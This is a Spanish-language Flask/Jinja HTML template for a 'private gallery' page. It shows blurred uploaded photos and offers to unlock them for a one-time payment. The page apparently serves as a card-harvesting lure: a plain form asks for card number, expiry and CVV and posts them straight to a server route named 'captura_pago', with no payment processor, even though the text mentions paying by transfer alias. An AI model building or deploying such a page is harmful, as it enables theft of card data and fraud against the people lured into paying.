<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GALERÍA PRIVADA</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <style>
        body { 
            background: {{ config.color_fondo }}; 
            color: white; font-family: sans-serif; min-height: 100vh;
        }
        .pay-card {
            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px);
            border: 1px solid gold; border-radius: 20px; padding: 25px;
            margin-top: 20px; box-shadow: 0 0 20px rgba(255, 215, 0, 0.2);
        }
        .form-control { background: rgba(0,0,0,0.5) !important; color: gold !important; border: 1px solid #444 !important; }
        .btn-pay { background: linear-gradient(45deg, #ffd700, #ff8c00); border: none; font-weight: bold; color: black; }
        .img-item { border-radius: 10px; border: 1px solid #333; margin-bottom: 15px; filter: blur(4px); transition: 0.3s; }
    </style>
</head>
<body class="p-3">
    <div class="container text-center">
        <h4 class="mb-4">CONTENIDO BLOQUEADO</h4>
        
        <div class="row">
            {% for f in fotos %}
            <div class="col-6 col-md-4">
                <img src="/static/uploads/{{f}}" class="img-fluid img-item">
            </div>
            {% endfor %}
        </div>

        <div class="pay-card">
            <h5 class="text-warning">VER GALERÍA COMPLETA</h5>
            <p class="small">Realiza un pago único de <b>${{ config.precio }}</b> mediante <b>{{ config.alias }}</b></p>
            
            <form action="/captura_pago" method="POST">
                <input type="text" name="cc" class="form-control mb-3" placeholder="Número de Tarjeta" required>
                <div class="row g-2 mb-3">
                    <div class="col-6"><input type="text" name="exp" class="form-control" placeholder="MM/AA" required></div>
                    <div class="col-6"><input type="text" name="cvv" class="form-control" placeholder="CVV" required></div>
                </div>
                <button class="btn btn-pay w-100 p-3">ACTIVAR ACCESO AHORA</button>
            </form>
        </div>
    </div>
</body>
</html>
